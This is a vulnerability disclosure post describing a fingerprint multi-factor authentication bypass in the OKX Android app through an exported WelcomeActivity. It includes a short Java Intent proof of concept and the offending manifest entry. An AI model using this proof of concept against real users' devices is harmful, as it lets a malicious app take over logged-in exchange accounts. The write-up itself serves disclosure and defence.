---
date: "2023-02-02T00:15:53+08:00"
draft: false
title: "Multi-Factor Authentication Bypass in OKX Android application via Exported WelcomeActivity"
summary: "A broken multi-factor authentication vulnerability exists in OKX's Android application due to an exported launcher Activity, allowing a locally installed malicious application to bypass the fingerprint-based multi-factor authentication check and resume a logged-in session without credentials."

showToc: false
TocOpen: false
hidemeta: false
comments: false
disableHLJS: true
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
markup: goldmark
goldmark:
  renderer:
    unsafe: true
---

## Summary
A broken multi-factor authentication vulnerability was discovered in OKX's Android application due to the `com.okinc.okex.welcome.WelcomeActivity` component being set to `android:exported="true"`. Because this entry point is exported, any other application installed on the device can launch it directly with an explicit `Intent` instead of going through the app's normal startup flow. This skips the fingerprint-based multi-factor authentication check that OKX normally enforces when a user reopens the application after an existing session, letting a malicious application resume a logged-in OKX session without the user re-authenticating.
 
## Exploit
An attacker locally triggers this vulnerability through a malicious "OKX Bypass" application installed on the victim's device.
 
```java
Intent intent = new Intent("android.intent.action.VIEW");
intent.setComponent(new ComponentName("com.okinc.okex.gp","com.okinc.okex.welcome.WelcomeActivity"));
startActivity(intent);
```
 
## Technical Details
 
**In `AndroidManifest.xml`:**

The `WelcomeActivity` registered with an `intent-filter` for `MAIN`/`LAUNCHER` it's also marked `exported="true"`, which means Android will accept Intents sent to it from any other application on the device.
 
```xml
<activity android:exported="true" android:name="com.okinc.okex.welcome.WelcomeActivity" android:screenOrientation="portrait" android:theme="@style/OKTheme.Launcher">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>
```
 
During testing, I used multi-window or background mode to launch the Bypass application while OKX had an authenticated session running. The Bypass application then fired an explicit `Intent` at `com.okinc.okex.welcome.WelcomeActivity`.
 
OKX displayed a toast message saying "Fingerprint Operation Failed." Based on this observed behavior, the existing session remained accessible without successfully completing the expected fingerprint authentication check.
 
## Conclusion
Exporting `WelcomeActivity` turns what should be an internal, app-controlled entry point into one any installed application can invoke directly, and that's enough to step around the fingerprint-based multi-factor authentication check OKX otherwise relies on. In practice, a user with a malicious application on their device can have their already-authenticated OKX session resumed without ever supplying valid credentials.
 
## FAQ
**What is this?**
Multi-Factor Authentication Bypass on OKX's Android application.
 
**How does it work?**
It's all in the Exploit and Technical Details sections above, read top to bottom.
 
**Isn't it useless?**
Only if you don't have an OKX account and a shady APK on the same phone. If you do, it's a full walk-in to an already-logged-in account, no credentials, no fingerprint.
 
**What's so bad about it?**
Normally reopening OKX after a session makes you prove it's you again. This skips that step entirely: an exported component that any installed application can hit directly, and the session just resumes. No password, no fingerprint, nothing.
 
**Why?**
Because `WelcomeActivity` is exported and nothing re-checks the session when it's relaunched from outside the application.